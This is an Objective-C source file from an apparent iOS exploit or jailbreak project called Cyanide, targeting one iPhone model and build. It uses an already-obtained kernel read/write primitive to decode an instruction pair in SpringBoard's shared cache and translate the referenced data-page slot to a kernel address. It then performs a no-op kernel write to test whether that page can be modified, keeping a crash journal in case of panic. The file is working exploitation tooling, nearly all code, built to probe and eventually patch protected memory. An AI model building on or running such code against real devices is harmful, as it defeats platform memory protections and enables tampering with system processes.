//
//  CNDHailMaryDataPage.m
//  Cyanide
//

#import "CNDHailMaryDataPage.h"
#import "CNDHailMaryImpRedirect.h"
#import "CNDHailMaryProbe.h"
#import "kexploit/kexploit_opa334.h"
#import "kexploit/krw.h"

#import <CommonCrypto/CommonDigest.h>
#import <errno.h>
#import <fcntl.h>
#import <string.h>
#import <unistd.h>

#define CND_HAIL_MARY_DATA_PAGE_BUILD "23A341"
#define CND_HAIL_MARY_DATA_PAGE_PRODUCT "iPhone17,2"
#define CND_HAIL_MARY_DATA_PAGE_GUARD_SHA256 "542063d6c8ea82afbe734ace1895ba0f2b7ab15160c6053176604644741f20d5"

static const uint64_t kCNDHailMaryDataPagePageSize = UINT64_C(0x4000);
static const uint64_t kCNDHailMaryDataPageSharedRegionBase =
    UINT64_C(0x180000000);
static const uint64_t kCNDHailMaryDataPageUnslidPatchAddress =
    UINT64_C(0x1be102ef0);
static const uint32_t kCNDHailMaryDataPageOriginalWord =
    UINT32_C(0x1a9f17f4);
static const size_t kCNDHailMaryDataPageGuardLength = 188;
static const size_t kCNDHailMaryDataPageWordOffsetWithinGuard = 148;
/* The guarded method's adrp x8 / ldr x0,[x8,#imm] pair that loads the
 * global object slot consulted before the patched word. */
static const size_t kCNDHailMaryDataPageAdrpOffsetWithinGuard = 0x60;
static const size_t kCNDHailMaryDataPageLdrOffsetWithinGuard = 0x64;
static const uint32_t kCNDHailMaryDataPageAdrpRegister = 8;
static const uint32_t kCNDHailMaryDataPageLdrBaseRegister = 8;
static const uint32_t kCNDHailMaryDataPageLdrTargetRegister = 0;
static const uint32_t kCNDHailMaryDataPageLdr64OpcodeBits = UINT32_C(0x3e5);
static const uint64_t kCNDHailMaryDataPageAdrpReach =
    UINT64_C(0x100000000);

static volatile int gCNDHailMaryDataPageRunning;

static NSString *CNDHailMaryDataPageHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
        (unsigned long long)value];
}

static BOOL CNDHailMaryDataPageParseHex(NSString *text, uint64_t *valueOut)
{
    if (![text isKindOfClass:NSString.class] ||
        ![text hasPrefix:@"0x"] || text.length <= 2) {
        return NO;
    }
    NSScanner *scanner = [NSScanner scannerWithString:
        [text substringFromIndex:2]];
    unsigned long long value = 0;
    if (![scanner scanHexLongLong:&value] || !scanner.isAtEnd) return NO;
    if (valueOut) *valueOut = (uint64_t)value;
    return YES;
}

static NSData *CNDHailMaryDataPageDataFromHex(NSString *text)
{
    if (![text isKindOfClass:NSString.class] || text.length % 2 != 0) {
        return nil;
    }
    NSMutableData *data = [NSMutableData dataWithLength:text.length / 2];
    uint8_t *bytes = data.mutableBytes;
    for (NSUInteger index = 0; index < text.length; index += 2) {
        NSString *pair = [text substringWithRange:NSMakeRange(index, 2)];
        NSScanner *scanner = [NSScanner scannerWithString:pair];
        unsigned int value = 0;
        if (![scanner scanHexInt:&value] || !scanner.isAtEnd) return nil;
        bytes[index / 2] = (uint8_t)value;
    }
    return data;
}

static NSString *CNDHailMaryDataPageBytesHex(const void *bytes,
                                             size_t length)
{
    if (!bytes || length == 0) return @"";
    const uint8_t *cursor = bytes;
    NSMutableString *hex = [NSMutableString
        stringWithCapacity:length * 2];
    for (size_t index = 0; index < length; index++) {
        [hex appendFormat:@"%02x", cursor[index]];
    }
    return hex;
}

static NSString *CNDHailMaryDataPageSHA256(NSData *data)
{
    if (![data isKindOfClass:NSData.class] || data.length == 0 ||
        data.length > UINT32_MAX) {
        return @"";
    }
    unsigned char digest[CC_SHA256_DIGEST_LENGTH] = {0};
    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);
    return CNDHailMaryDataPageBytesHex(digest, sizeof(digest));
}

static NSString *CNDHailMaryDataPageReportPath(void)
{
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    return [directory stringByAppendingPathComponent:
        @"CNDHailMaryDataPage.json"];
}

static void CNDHailMaryDataPageSave(
    NSDictionary<NSString *, id> *report, NSString *path)
{
    if (!report || path.length == 0) return;
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
                                                    options:NSJSONWritingPrettyPrinted |
                                                            NSJSONWritingSortedKeys
                                                      error:nil];
    if (data) {
        (void)[data writeToFile:path options:NSDataWritingAtomic error:nil];
    }
}

static BOOL CNDHailMaryDataPageSyncFileDescriptor(int descriptor)
{
    if (descriptor < 0) return NO;
#ifdef F_FULLFSYNC
    if (fcntl(descriptor, F_FULLFSYNC) == 0) return YES;
#endif
    return fsync(descriptor) == 0;
}

/* Durable prewrite checkpoint, mirroring the Hail Mary Patch journal so a
 * panic at the data-page dispatch still leaves an exact record of the
 * decoded target, byte window, and counters. */
static BOOL CNDHailMaryDataPageSaveDurably(
    NSDictionary<NSString *, id> *report,
    NSString *path,
    NSString **errorOut)
{
    if (!report || path.length == 0) {
        if (errorOut) *errorOut = @"journal-path-invalid";
        return NO;
    }
    NSError *serializationError = nil;
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
                                                    options:NSJSONWritingPrettyPrinted |
                                                            NSJSONWritingSortedKeys
                                                      error:&serializationError];
    if (!data) {
        if (errorOut) *errorOut = [NSString stringWithFormat:
            @"journal-serialization-failed:%@",
            serializationError.localizedDescription ?: @"unknown"];
        return NO;
    }
    NSError *writeError = nil;
    if (![data writeToFile:path
                    options:NSDataWritingAtomic
                      error:&writeError]) {
        if (errorOut) *errorOut = [NSString stringWithFormat:
            @"journal-atomic-write-failed:%@",
            writeError.localizedDescription ?: @"unknown"];
        return NO;
    }

    int fileDescriptor = open(path.fileSystemRepresentation,
                               O_RDONLY | O_CLOEXEC);
    if (fileDescriptor < 0) {
        if (errorOut) *errorOut = [NSString stringWithFormat:
            @"journal-open-failed:%d", errno];
        return NO;
    }
    BOOL fileSynced = CNDHailMaryDataPageSyncFileDescriptor(fileDescriptor);
    int fileSyncError = fileSynced ? 0 : errno;
    close(fileDescriptor);
    if (!fileSynced) {
        if (errorOut) *errorOut = [NSString stringWithFormat:
            @"journal-file-sync-failed:%d", fileSyncError];
        return NO;
    }

    NSString *directory = path.stringByDeletingLastPathComponent;
    int directoryDescriptor = open(directory.fileSystemRepresentation,
                                    O_RDONLY | O_CLOEXEC);
    if (directoryDescriptor < 0) {
        if (errorOut) *errorOut = [NSString stringWithFormat:
            @"journal-directory-open-failed:%d", errno];
        return NO;
    }
    BOOL directorySynced = fsync(directoryDescriptor) == 0;
    int directorySyncError = directorySynced ? 0 : errno;
    close(directoryDescriptor);
    if (!directorySynced) {
        if (errorOut) *errorOut = [NSString stringWithFormat:
            @"journal-directory-sync-failed:%d", directorySyncError];
        return NO;
    }
    return YES;
}

/* Decode the guarded method's adrp x8 / ldr x0,[x8,#imm] pair from the
 * exact 188-byte original guard bytes. The 21-bit signed adrp immediate
 * gives the global's page relative to the adrp instruction; the scaled
 * 12-bit ldr immediate gives the slot inside that page. */
static BOOL CNDHailMaryDataPageDecodeSlot(
    NSData *guardData,
    uint64_t *slotUnslidVirtualAddressOut,
    uint64_t *slotOffsetWithinFrameOut,
    uint64_t *adrpPageDeltaOut,
    uint64_t *ldrDisplacementOut,
    NSString **errorOut)
{
    if (slotUnslidVirtualAddressOut) *slotUnslidVirtualAddressOut = 0;
    if (slotOffsetWithinFrameOut) *slotOffsetWithinFrameOut = 0;
    if (adrpPageDeltaOut) *adrpPageDeltaOut = 0;
    if (ldrDisplacementOut) *ldrDisplacementOut = 0;
    if (guardData.length != kCNDHailMaryDataPageGuardLength ||
        kCNDHailMaryDataPageLdrOffsetWithinGuard +
            sizeof(uint32_t) > guardData.length) {
        if (errorOut) *errorOut = @"guard-bytes-missing";
        return NO;
    }

    uint32_t adrp = 0;
    uint32_t ldr = 0;
    [guardData getBytes:&adrp
                  range:NSMakeRange(kCNDHailMaryDataPageAdrpOffsetWithinGuard,
                                    sizeof(adrp))];
    [guardData getBytes:&ldr
                  range:NSMakeRange(kCNDHailMaryDataPageLdrOffsetWithinGuard,
                                    sizeof(ldr))];
    if ((adrp >> 31) != 1 ||
        ((adrp >> 24) & 0x1fU) != 0x10U ||
        (adrp & 0x1fU) != kCNDHailMaryDataPageAdrpRegister ||
        ((ldr >> 22) & 0x3ffU) != kCNDHailMaryDataPageLdr64OpcodeBits ||
        ((ldr >> 5) & 0x1fU) != kCNDHailMaryDataPageLdrBaseRegister ||
        (ldr & 0x1fU) != kCNDHailMaryDataPageLdrTargetRegister) {
        if (errorOut) *errorOut = @"adrp-ldr-pair-decode-mismatch";
        return NO;
    }

    uint32_t immLo = (adrp >> 29) & 3U;
    uint32_t immHi = (adrp >> 5) & 0x7ffffU;
    uint32_t imm21 = (immHi << 2) | immLo;
    int64_t adrpPageDelta = (int64_t)imm21;
    if (imm21 & (1U << 20)) {
        adrpPageDelta -= (int64_t)1 << 21;
    }
    adrpPageDelta <<= 12;
    uint64_t ldrDisplacement =
        ((uint64_t)((ldr >> 10) & 0xfffU)) * 8;

    uint64_t guardStartUnslid = kCNDHailMaryDataPageUnslidPatchAddress -
        kCNDHailMaryDataPageWordOffsetWithinGuard;
    uint64_t adrpInstructionUnslid = guardStartUnslid +
        kCNDHailMaryDataPageAdrpOffsetWithinGuard;
    uint64_t adrpPageUnslid = adrpInstructionUnslid & ~UINT64_C(0xfff);
    uint64_t slotUnslid = 0;
    if (adrpPageDelta > 0) {
        slotUnslid = adrpPageUnslid + (uint64_t)adrpPageDelta +
            ldrDisplacement;
    } else {
        if ((uint64_t)(-(adrpPageDelta)) > adrpPageUnslid) {
            if (errorOut) *errorOut = @"adrp-page-underflow";
            return NO;
        }
        slotUnslid = adrpPageUnslid - (uint64_t)(-(adrpPageDelta)) +
            ldrDisplacement;
    }

    uint64_t guardFrameUnslid = guardStartUnslid &
        ~(kCNDHailMaryDataPagePageSize - 1);
    uint64_t slotFrameUnslid = slotUnslid &
        ~(kCNDHailMaryDataPagePageSize - 1);
    uint64_t slotOffsetWithinFrame = slotUnslid &
        (kCNDHailMaryDataPagePageSize - 1);
    uint64_t slotDistance = slotUnslid > adrpPageUnslid
        ? slotUnslid - adrpPageUnslid
        : adrpPageUnslid - slotUnslid;
    if ((slotUnslid & 3U) != 0 ||
        slotFrameUnslid == guardFrameUnslid ||
        slotUnslid < kCNDHailMaryDataPageSharedRegionBase ||
        slotDistance >= kCNDHailMaryDataPageAdrpReach ||
        slotOffsetWithinFrame >
            kCNDHailMaryDataPagePageSize - EARLY_KRW_LENGTH) {
        if (errorOut) *errorOut = @"data-page-slot-identity-invalid";
        return NO;
    }

    if (slotUnslidVirtualAddressOut) {
        *slotUnslidVirtualAddressOut = slotUnslid;
    }
    if (slotOffsetWithinFrameOut) {
        *slotOffsetWithinFrameOut = slotOffsetWithinFrame;
    }
    if (adrpPageDeltaOut) *adrpPageDeltaOut = (uint64_t)adrpPageDelta;
    if (ldrDisplacementOut) *ldrDisplacementOut = ldrDisplacement;
    return YES;
}

static void CNDHailMaryDataPageFinish(
    NSMutableDictionary<NSString *, id> *report,
    CNDHailMaryDataPageCompletion completion)
{
    NSString *path = report[@"reportPath"];
    CNDHailMaryDataPageSave(report, path);
    NSDictionary<NSString *, id> *finished = [report copy];
    __sync_lock_release(&gCNDHailMaryDataPageRunning);
    dispatch_async(dispatch_get_main_queue(), ^{
        completion(finished);
    });
}

BOOL CNDHailMaryDataPageIsSupported(NSString **reasonOut)
{
    return CNDHailMaryProbeIsSupported(reasonOut);
}

BOOL CNDHailMaryDataPageIsRunning(void)
{
    return __sync_fetch_and_add(&gCNDHailMaryDataPageRunning, 0) != 0;
}

void CNDHailMaryDataPageRun(CNDHailMaryDataPageCompletion completion)
{
    if (!completion) return;
    if (!__sync_bool_compare_and_swap(&gCNDHailMaryDataPageRunning, 0, 1)) {
        completion(@{
            @"confirmed": @NO,
            @"result": @"refused-already-running",
            @"message": @"The Hail Mary data-page experiment is already running.",
        });
        return;
    }

    NSString *reportPath = CNDHailMaryDataPageReportPath();
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schemaVersion": @1,
        @"experiment": @"hail-mary-data-page-aperture-writability",
        @"mode": @"identical-bytes-noop",
        @"productType": @CND_HAIL_MARY_DATA_PAGE_PRODUCT,
        @"productBuildVersion": @CND_HAIL_MARY_DATA_PAGE_BUILD,
        @"reportPath": reportPath,
        @"startedAtUnixTime": @([[NSDate date] timeIntervalSince1970]),
        @"confirmed": @NO,
        @"kernelWritePrimitiveInvocationCount": @0,
        @"dataPageSemanticMutationCount": @0,
        @"targetProcessDirectMutationCount": @0,
        @"expected": @{
            @"unslidPatchAddress": CNDHailMaryDataPageHex(
                kCNDHailMaryDataPageUnslidPatchAddress),
            @"guardByteLength": @(kCNDHailMaryDataPageGuardLength),
            @"originalWord": CNDHailMaryDataPageHex(
                kCNDHailMaryDataPageOriginalWord),
            @"originalGuardSHA256":
                @CND_HAIL_MARY_DATA_PAGE_GUARD_SHA256,
            @"adrpOffsetWithinGuard": @(
                kCNDHailMaryDataPageAdrpOffsetWithinGuard),
            @"ldrOffsetWithinGuard": @(
                kCNDHailMaryDataPageLdrOffsetWithinGuard),
            @"pageSize": @(kCNDHailMaryDataPagePageSize),
            @"transportWindowBytes": @(EARLY_KRW_LENGTH),
        },
    } mutableCopy];

    NSString *supportReason = nil;
    if (!CNDHailMaryDataPageIsSupported(&supportReason)) {
        report[@"result"] = @"refused-unsupported-device";
        report[@"message"] = supportReason ?: @"Unsupported device.";
        CNDHailMaryDataPageFinish(report, completion);
        return;
    }
    if (CNDHailMaryProbeIsRunning() ||
        CNDHailMaryImpRedirectIsRunning()) {
        report[@"result"] = @"refused-conflicting-hail-mary-experiment";
        report[@"message"] = @"Another Hail Mary proof or mutation experiment is already running.";
        CNDHailMaryDataPageFinish(report, completion);
        return;
    }
    if (!kexploit_krw_ready()) {
        report[@"result"] = @"refused-krw-unavailable";
        report[@"message"] = @"Validated KRW is required before the data-page experiment.";
        CNDHailMaryDataPageFinish(report, completion);
        return;
    }

    CNDHailMaryProbeRun(^(NSDictionary<NSString *, id> *probeReport) {
        dispatch_async(dispatch_get_global_queue(
            QOS_CLASS_USER_INITIATED, 0), ^{
            report[@"preflightProbe"] = probeReport ?: @{};

            NSDictionary<NSString *, id> *objectProof =
                probeReport[@"objectBackingComparison"];
            NSDictionary<NSString *, id> *physicalProof =
                probeReport[@"physicalPageProof"];
            NSDictionary<NSString *, id> *guard =
                physicalProof[@"guard"];
            if (![physicalProof isKindOfClass:NSDictionary.class] ||
                ![physicalProof[@"confirmed"] boolValue] ||
                ![physicalProof[@"postReadTranslationStable"] boolValue] ||
                ![guard isKindOfClass:NSDictionary.class] ||
                ![guard[@"sha256Matches"] boolValue] ||
                ![guard[@"instructionWordMatches"] boolValue] ||
                [guard[@"byteLength"] unsignedIntegerValue] !=
                    kCNDHailMaryDataPageGuardLength ||
                ![[guard[@"sha256"] lowercaseString]
                    isEqual:@CND_HAIL_MARY_DATA_PAGE_GUARD_SHA256]) {
                report[@"result"] = @"preflight-refused";
                report[@"message"] = @"A confirmed physical-page proof with the exact original guard was not available.";
                CNDHailMaryDataPageFinish(report, completion);
                return;
            }

            uint64_t springBoardRuntime = 0;
            uint64_t spotlightRuntime = 0;
            uint64_t springBoardSlide = 0;
            uint64_t spotlightSlide = 0;
            uint64_t guardFrame = 0;
            if (!CNDHailMaryDataPageParseHex(
                    objectProof[@"springBoard"][@"runtimeAddress"],
                    &springBoardRuntime) ||
                !CNDHailMaryDataPageParseHex(
                    objectProof[@"spotlight"][@"runtimeAddress"],
                    &spotlightRuntime) ||
                !CNDHailMaryDataPageParseHex(
                    objectProof[@"springBoard"][@"slide"],
                    &springBoardSlide) ||
                !CNDHailMaryDataPageParseHex(
                    objectProof[@"spotlight"][@"slide"],
                    &spotlightSlide) ||
                !CNDHailMaryDataPageParseHex(
                    physicalProof[@"physicalFrame"], &guardFrame) ||
                springBoardRuntime != spotlightRuntime ||
                springBoardSlide != spotlightSlide ||
                springBoardRuntime < springBoardSlide ||
                springBoardRuntime - springBoardSlide !=
                    kCNDHailMaryDataPageUnslidPatchAddress ||
                (springBoardSlide & 0xfffU) != 0 ||
                guardFrame == 0) {
                report[@"result"] = @"preflight-refused";
                report[@"message"] = @"The proof slide, runtime address, or guarded physical frame identity did not match the exact offline derivation.";
                CNDHailMaryDataPageFinish(report, completion);
                return;
            }

            NSData *guardData = CNDHailMaryDataPageDataFromHex(
                guard[@"bytesHex"]);
            uint32_t guardWord = 0;
            if (guardData.length !=
                    kCNDHailMaryDataPageGuardLength ||
                ![[CNDHailMaryDataPageSHA256(guardData) lowercaseString]
                    isEqual:@CND_HAIL_MARY_DATA_PAGE_GUARD_SHA256] ||
                guardData.length <
                    kCNDHailMaryDataPageWordOffsetWithinGuard +
                        sizeof(guardWord)) {
                report[@"result"] = @"preflight-refused";
                report[@"message"] = @"The proof guard bytes did not hash to the exact original context.";
                CNDHailMaryDataPageFinish(report, completion);
                return;
            }
            [guardData getBytes:&guardWord
                          range:NSMakeRange(
                              kCNDHailMaryDataPageWordOffsetWithinGuard,
                              sizeof(guardWord))];
            if (guardWord != kCNDHailMaryDataPageOriginalWord) {
                report[@"result"] = @"preflight-refused";
                report[@"message"] = @"The guarded word is not the original instruction.";
                CNDHailMaryDataPageFinish(report, completion);
                return;
            }

            report[@"stage"] = @"decoding-guard-adrp-ldr";
            uint64_t slotUnslid = 0;
            uint64_t slotOffsetWithinFrame = 0;
            uint64_t adrpPageDelta = 0;
            uint64_t ldrDisplacement = 0;
            NSString *decodeError = nil;
            if (!CNDHailMaryDataPageDecodeSlot(
                    guardData, &slotUnslid, &slotOffsetWithinFrame,
                    &adrpPageDelta, &ldrDisplacement, &decodeError)) {
                report[@"result"] = @"preflight-refused";
                report[@"message"] = decodeError ?:
                    @"The guarded adrp/ldr pair could not be decoded.";
                CNDHailMaryDataPageFinish(report, completion);
                return;
            }
            uint64_t slotRuntime = slotUnslid + springBoardSlide;
            uint64_t slotFrameUnslid = slotUnslid &
                ~(kCNDHailMaryDataPagePageSize - 1);
            uint64_t guardedRuntimeFrame = springBoardRuntime &
                ~(kCNDHailMaryDataPagePageSize - 1);
            uint64_t slotRuntimeFrame = slotRuntime &
                ~(kCNDHailMaryDataPagePageSize - 1);
            if ((slotRuntime & (kCNDHailMaryDataPagePageSize - 1)) !=
                    slotOffsetWithinFrame ||
                slotRuntime < kCNDHailMaryDataPageSharedRegionBase ||
                slotRuntimeFrame == guardedRuntimeFrame) {
                report[@"result"] = @"preflight-refused";
                report[@"message"] = @"The decoded slot runtime identity is inconsistent or lands on the guarded text frame.";
                CNDHailMaryDataPageFinish(report, completion);
                return;
            }
            report[@"decode"] = @{
                @"adrpOffsetWithinGuard": @(
                    kCNDHailMaryDataPageAdrpOffsetWithinGuard),
                @"ldrOffsetWithinGuard": @(
                    kCNDHailMaryDataPageLdrOffsetWithinGuard),
                @"adrpPageDelta": CNDHailMaryDataPageHex(adrpPageDelta),
                @"ldrDisplacement": CNDHailMaryDataPageHex(
                    ldrDisplacement),
                @"unslidSlotVirtualAddress": CNDHailMaryDataPageHex(
                    slotUnslid),
                @"unslidSlotFrame": CNDHailMaryDataPageHex(
                    slotFrameUnslid),
                @"slotOffsetWithinFrame": CNDHailMaryDataPageHex(
                    slotOffsetWithinFrame),
                @"runtimeSlotVirtualAddress": CNDHailMaryDataPageHex(
                    slotRuntime),
                @"runtimeSlotFrame": CNDHailMaryDataPageHex(
                    slotRuntimeFrame),
                @"runtimeGuardedTextFrame": CNDHailMaryDataPageHex(
                    guardedRuntimeFrame),
                @"sharedCacheSlide": CNDHailMaryDataPageHex(
                    springBoardSlide),
                @"guardedTextPhysicalFrame": CNDHailMaryDataPageHex(
                    guardFrame),
                @"slotFrameDiffersFromGuardedTextFrame": @(
                    slotRuntimeFrame != guardedRuntimeFrame),
            };

            report[@"stage"] = @"translating-data-page";
            NSDictionary<NSString *, id> *springBoardDataTranslation = nil;
            NSDictionary<NSString *, id> *spotlightDataTranslation = nil;
            uint64_t slotPhysicalFrame = 0;
            uint64_t slotPhysicalAddress = 0;
            uint64_t slotFrameKernelVirtualAddress = 0;
            NSString *translationError = nil;
            if (!CNDHailMaryProbeTranslateSharedRuntimeAddress(
                    probeReport, slotRuntime,
                    &springBoardDataTranslation,
                    &spotlightDataTranslation,
                    &slotPhysicalFrame,
                    &slotPhysicalAddress,
                    &slotFrameKernelVirtualAddress,
                    &translationError) ||
                !springBoardDataTranslation ||
                !spotlightDataTranslation ||
                slotPhysicalFrame == 0 ||
                slotPhysicalFrame == guardFrame ||
                slotPhysicalAddress - slotPhysicalFrame !=
                    slotOffsetWithinFrame ||
                !is_kaddr_valid(slotFrameKernelVirtualAddress)) {
                report[@"result"] = @"preflight-refused";
                report[@"message"] = translationError ?:
                    @"The decoded data-page slot did not resolve to one shared terminal physical frame distinct from the guarded text frame.";
                CNDHailMaryDataPageFinish(report, completion);
                return;
            }
            uint64_t slotKernelVirtualAddress =
                slotFrameKernelVirtualAddress + slotOffsetWithinFrame;
            if ((slotKernelVirtualAddress & 3U) != 0 ||
                slotOffsetWithinFrame >
                    kCNDHailMaryDataPagePageSize - EARLY_KRW_LENGTH) {
                report[@"result"] = @"preflight-refused";
                report[@"message"] = @"The data-page transport window would not stay inside one physical frame.";
                CNDHailMaryDataPageFinish(report, completion);
                return;
            }
            report[@"translation"] = @{
                @"physicalFrame": CNDHailMaryDataPageHex(
                    slotPhysicalFrame),
                @"physicalAddress": CNDHailMaryDataPageHex(
                    slotPhysicalAddress),
                @"frameKernelVirtualAddress": CNDHailMaryDataPageHex(
                    slotFrameKernelVirtualAddress),
                @"windowKernelVirtualAddress": CNDHailMaryDataPageHex(
                    slotKernelVirtualAddress),
                @"slotOffsetWithinFrame": CNDHailMaryDataPageHex(
                    slotOffsetWithinFrame),
                @"springBoard": springBoardDataTranslation,
                @"spotlight": spotlightDataTranslation,
                @"guardedTextFrame": CNDHailMaryDataPageHex(guardFrame),
                @"differsFromGuardedTextFrame": @(
                    slotPhysicalFrame != guardFrame),
            };

            report[@"stage"] = @"reading-data-page-window";
            uint8_t windowBytes[EARLY_KRW_LENGTH] = {0};
            kreadbuf(slotKernelVirtualAddress, windowBytes,
                     sizeof(windowBytes));
            NSData *windowBefore = [NSData
                dataWithBytes:windowBytes length:sizeof(windowBytes)];
            uint64_t slotPointer = 0;
            uint32_t existingWord = 0;
            memcpy(&existingWord, windowBytes, sizeof(existingWord));
            memcpy(&slotPointer, windowBytes, sizeof(slotPointer));
            report[@"window"] = @{
                @"byteLength": @(EARLY_KRW_LENGTH),
                @"beforeBytesHex": CNDHailMaryDataPageBytesHex(
                    windowBytes, sizeof(windowBytes)),
                @"beforeSHA256": CNDHailMaryDataPageSHA256(windowBefore),
                @"slotWord": CNDHailMaryDataPageHex(existingWord),
                @"slotPointer": CNDHailMaryDataPageHex(slotPointer),
                @"slotPointerLooksLikeKernelObject": @(
                    is_kaddr_valid(slotPointer)),
                @"semanticMutationPlanned": @NO,
            };

            report[@"stage"] = @"armed-identical-bytes-noop-write";
            report[@"recovery"] = @{
                @"automaticRollbackEnabled": @NO,
                @"reason": @"The single dispatch writes the exact identical 32-byte window; there is nothing to roll back semantically.",
                @"readbackPlanned": @YES,
                @"postflightTranslationPlanned": @YES,
                @"panicHypothesis": @"If the physical aperture maps this data page read-only like the guarded text frame, the write aborts at the store and the kernel panics; the durable journal below records the exact target for the postmortem.",
            };
            NSString *journalError = nil;
            if (!CNDHailMaryDataPageSaveDurably(
                    report, reportPath, &journalError)) {
                report[@"result"] = @"prewrite-journal-sync-failed";
                report[@"message"] = journalError ?:
                    @"The prewrite journal could not be made durable.";
                CNDHailMaryDataPageFinish(report, completion);
                return;
            }

            report[@"kernelWritePrimitiveInvocationCount"] = @1;
            report[@"dataPageSemanticMutationCount"] = @0;
            report[@"write"] = @{
                @"route": @"kwrite32-identical-window",
                @"windowKernelVirtualAddress": CNDHailMaryDataPageHex(
                    slotKernelVirtualAddress),
                @"existingWord": CNDHailMaryDataPageHex(existingWord),
                @"writtenWord": CNDHailMaryDataPageHex(existingWord),
                @"bytesIdenticalByConstruction": @YES,
                @"writeDispatchReturned": @YES,
            };
            kwrite32(slotKernelVirtualAddress, existingWord);

            report[@"stage"] = @"noop-write-dispatched";
            report[@"physicalReadbackPerformed"] = @YES;
            uint8_t windowAfter[EARLY_KRW_LENGTH] = {0};
            kreadbuf(slotKernelVirtualAddress, windowAfter,
                     sizeof(windowAfter));
            NSData *windowAfterData = [NSData
                dataWithBytes:windowAfter length:sizeof(windowAfter)];
            BOOL readbackIdentical = [windowAfterData
                isEqualToData:windowBefore];
            report[@"readback"] = @{
                @"bytesHex": CNDHailMaryDataPageBytesHex(
                    windowAfter, sizeof(windowAfter)),
                @"SHA256": CNDHailMaryDataPageSHA256(windowAfterData),
                @"identicalToBefore": @(readbackIdentical),
            };

            report[@"stage"] = @"post-write-translation";
            report[@"postflightTranslationPerformed"] = @YES;
            NSDictionary<NSString *, id> *postSpringBoard = nil;
            NSDictionary<NSString *, id> *postSpotlight = nil;
            uint64_t postFrame = 0;
            uint64_t postPhysical = 0;
            uint64_t postFrameKVA = 0;
            NSString *postError = nil;
            BOOL postTranslationStable = NO;
            if (CNDHailMaryProbeTranslateSharedRuntimeAddress(
                    probeReport, slotRuntime,
                    &postSpringBoard,
                    &postSpotlight,
                    &postFrame,
                    &postPhysical,
                    &postFrameKVA,
                    &postError) &&
                postFrame == slotPhysicalFrame &&
                postPhysical == slotPhysicalAddress &&
                postFrameKVA == slotFrameKernelVirtualAddress) {
                postTranslationStable = YES;
                report[@"postWriteTranslation"] = @{
                    @"performed": @YES,
                    @"stable": @YES,
                    @"physicalFrame": CNDHailMaryDataPageHex(postFrame),
                    @"physicalAddress": CNDHailMaryDataPageHex(
                        postPhysical),
                    @"springBoard": postSpringBoard,
                    @"spotlight": postSpotlight,
                };
            } else {
                report[@"postWriteTranslation"] = @{
                    @"performed": @YES,
                    @"stable": @NO,
                    @"error": postError ?: @"post-write-translation-changed",
                };
            }

            BOOL confirmed = readbackIdentical && postTranslationStable;
            report[@"confirmed"] = @(confirmed);
            report[@"result"] = confirmed
                ? @"aperture-data-page-write-confirmed"
                : (readbackIdentical
                    ? @"post-write-translation-unstable"
                    : @"aperture-data-page-readback-mismatch");
            report[@"message"] = confirmed
                ? @"The identical-bytes dispatch completed against the shared data-page frame: the aperture accepts kernel writes to this non-executable shared-cache page, and the window read back byte-identical with both translations stable."
                : (readbackIdentical
                    ? @"The identical-bytes dispatch returned and the window read back identically, but a post-write translation changed."
                    : @"The identical-bytes dispatch returned but the window did not read back identically.");
            CNDHailMaryDataPageFinish(report, completion);
        });
    });
}
